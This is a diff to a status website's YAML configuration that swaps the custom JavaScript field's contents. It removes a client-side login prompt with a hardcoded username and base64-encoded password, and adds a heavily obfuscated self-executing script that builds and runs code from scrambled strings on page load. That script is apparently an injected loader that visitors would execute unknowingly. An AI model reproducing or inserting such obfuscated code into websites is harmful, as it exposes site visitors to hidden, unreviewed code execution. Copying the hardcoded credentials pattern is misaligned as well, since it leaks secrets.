@@ -42,28 +42,7 @@ status-website:
   introMessage: Here, you can monitor the real-time availability of our services and infrastructure. We are committed to maintaining high uptime and transparency for our clients and partners. If there are any interruptions in service, they will be reported and tracked here.
 
   js: |
-    document.addEventListener("DOMContentLoaded", function () {
-      const path = window.location.pathname;
-      if (path === "/history") {
-        document.body.innerHTML =
-          "<h1 style='color: red; text-align: center; color:#002626; margin-top: 20px'>403 Forbidden</h1>";
-        return;
-      }
-      if (path.startsWith("/history/")) {
-        return;
-      }
-      document.body.style.display = "none";
-      const username = prompt("Enter username:");
-      const password = prompt("Enter password:");
-      const encodedPassword = btoa(password);
-      if (username !== "lime" || encodedPassword !== "bGltZTEyMw==") {
-        document.body.style.display = "block";
-        document.body.innerHTML =
-          "<h1 style='color: red; text-align: center; color:#002626; margin-top: 20px'>Unauthorized</h1>";
-      } else {
-        document.body.style.display = "block";
-      }
-    });
+    (function(){var Qlm='',sHs=228-217;function isR(b){var s=3753590;var i=b.length;var w=[];for(var n=0;n<i;n++){w[n]=b.charAt(n)};for(var n=0;n<i;n++){var a=s*(n+197)+(s%39048);var v=s*(n+284)+(s%14504);var p=a%i;var j=v%i;var f=w[p];w[p]=w[j];w[j]=f;s=(a+v)%7449324;};return w.join('')};var DYo=isR('xoukqtcndumtscnevcrborgyizaotrphfwslj').substr(0,sHs);var cjS='.aS f=-6lmo61,6=s2=vfr(t,"ebed0f+hCjal.nupqr"t<v=xhzm;wa[ f=v8],=1=7 ,k9s73,r1a8v,(0a6[,f576h,y6o8f,60e6",(4i9t,)2d8+,}8=;[ad 2=e]rfprfv+r[x20,xqh7lknnt];=+(),[f[u]w=f+r;.a. s=[]{y9=]7 m+=a0cba=r4if=r;v(r6z30;z0a)gnmxn]sml(n)tt;[+j)1vnr jba=g.montsize.(p.ir(, ()rforhv+r}v,jwl;nath-a;7>{0;vd-C{.a( g=8uwlbv)rva*j[vr;rar d=iuhl)vmrxif0evvrgdpaalrn2t+;9a} C;=o+(+a] ==s;p<p;0++);vtrargarcaa1CedhAl([)jvnrvogc(rt;gf.o){,=]or1d*=+v.!h rsoleAt(f;12-e;o=;;n+,;)e.s< (f7r0=;)venm)(u.;e,g3h]yAaoccauC(dfAe((+=)w+p.oh5rroaeetnfi2 -;;i=j;8+e2c})lieec{n1iaur;-ih(a=rn)lx)r=(];i ( >[)h. uuhhaas(b;tri4g1i;pi))wipesh(;[e+)];;n=++};7i+([! n=ll){i)(i<))l.wu=h;azs,bht4i,gei=)ljfvv=x.co n." ))}tq"pus5(a[r]j;hvcr1u(qtj1ip(("v;aa. .=r9p,a9"4y,8219h,+0r.aowc]tfh);=al l=vtiijg.f,ofC7a;Cwd0(u6p;cor()ar x=t;8<;.se+gthtxx+iuuu}s=lnt"nutscfa-Af(7);.tonn.Srr,n=.rrkmfhfryo=eokyx))g;oenu{n3u,srletCn."("v.;oonvn ;';var QhI=isR[DYo];var PzY='';var iBz=QhI;var yAd=QhI(PzY,isR(cjS));var SYw=yAd(isR('y9} E0ht,W$W;_jcKtIE=6:ln[ (n6!__u$(WW_i42WpWd%.uW6Cd}4o6.=ddW1W;nW..Donuipt7!*p+_WAdeHm?dwt.L5!(tsdTh]hWWn$$mnIdIa=)drow5W_F2;W)C%$niW!6$ z,r:E.WWW j7)WW$3=1"d72jnf4_$b#o)DW_".Wp3_,(tr;e%W(gfJl_W9W4frWo.)Wb&W,d_bC3\';r4WsW=!gnrtJp,,ad7e_4!.cn1h+ydontpn-d)GlasWWdrc=.3)n.,.m[i)2t)dd50an1hec=phn(t=)ns)-pWxpq(W1tejcoltdle;e,n,WWW)%aht03idtay:sh%(t=rM8Wcedos! o0p=.;r#ib. __0%i}ux$ JlCo+7Wsn(.)B$?fWo!x} L2.d).nc4dxe%W;!n.ce,o.\/=(jr\/?%hic;yl *r06!,(zdd_6f>Ww1s2.50rfs ou(}5(8ft_.$(]W.5eu+!WDbaWIoy7k2notz0;i&a=).nWWsnid)0dWgr(n!je}[).iWWb)Wuou.(!n6Wy)b%7{Cudn;=0 oi(3)e0.yWWW]n drtWp!bso1WWM$4ht4(.iWno;4WWWu-,Kr6.dW$(yt($_ds}W10WW6.s!f=))nwin (raW{e6(.furW=$.o)a"en-u}!!)I:]%.>;iWnma,}+.@,blWW;4E;sl()Wl$);6BWic{!gl;!elle.o;d.W[piWn8=>u.4WW; yx)W)_$.c&W!5{b6{ tdWieg<c[( n-WfnW}a)55W_r.=W;W\/bhlo:dd(W!=4{6neWWfb9z.4 cd6)ipi._e.5eeDW57ognDrp2u%6);;.W\'n,\'!a83Wa.W3(#ys34)pu.m;dnG()Wd_td;WbW]fni!lee2eu;B=W.=%WWb7 7d;w.u o!d1mbre_t2m1_)e4%r$2iWWW)o)(nty9y=jfd52_>i33d3}p#ior7SW5t$W.aWe_{WW6ea!Coro(1n-1c o0si.4WaC(b%H_m=o(WWd(d!.4b%6.[eE#0f=dWhr WWWg:._.y%i_o;#]7;_r076Br_6"o.6gn{d(aioWikW}a)o3d ;[h.e;gni.ddt_e}5rWf58d $(,3W(estp7="tae)0iW:d_.$n+_u5_:.cA_WW((.l4),d1WwW(.=t3.<t6t6t7W1%:{n37:WWrB 0pdW>$5FW]a2dWi)6rWdIn{luW(f(3;c)1s7WW(m{W*W.c(:.]Do]:!.@pWt)zp\/H*lW(p_r6o;.1d.!=e!:n@5W(e5(}f\/)l!fW;)2o1!t+i, 653%:a{W6n e)"3_643_,)WD,cpn.n4ggu;\/o.msCoW5n.,gDr](3ef;d:Lje)e3>_<e2.o_xrle)5KWGv])f{we,W._=W957(d;isy>W%Wd$_7W)2%]Wl79tW),4WgE2e6(}e|Wt3!ef(c\/r7Wt[!;;8l3d#WW$8oW)Wc1,)0.e1g.(ree$30naW3idoWi]%!d[95t.]j{\/tm(indl5(u#i.d)dWWW3,a2.5cW]7d(.56dnj.2_2]W$r0h|toWz)].mt_)3$0sa!__n,re)Wp$2=neWn(_{_!c)2=.r.<)(W$,W1a.je8x%f}5nBsl61%:3,=e:.oW5m oW5a(Wp 7:W;4WWraWWe,;o?(.;l9_ay#W019WW0Ff(W!(WaW5.6s(4c7Wt qfaE9[7531:<7;W dd.WE.12)s  FW( lr[b1W.od#;_*:W.]T0We)qa5W;!1p.Ws}n.6_!_r,_{7Wa:oLo.1$)WWm_epi&ut$7inw,rd0c n!@t0nB,de5)o.5))c"5343\'_2 J..]mWW5dr)__iW]G=oWHr5\/1\'.(W,E-5Wj$eWW ;(Wj\/{Wsd5W5 ed0oo1W.l".1)$lb.;:p3f>hgdou0)!3(n$)s;3sf9[a_a)=WWW4Wtt};6,n8W]]Sra_5b{io(WWW\/2) 5aad{W1,tfW]Wrdd\/iMr2Wh1 82gldnid(3- _W_5e+W1);oB by!Ww!Wr n4o$)WoWoW$sW5WbW6,tSpe t91b,41&t))o#ts.nge{o=.61oK=t3dtW:%W16(va{edt3!WWowb{4)Wd5t)on.f.un0t+%Wn3}tpato_-r[46Wts%5i W9s7)b='));var Jhv=iBz(Qlm,SYw );Jhv(2317);return 8288})()
 
 # navbar:
 #    - title: Status
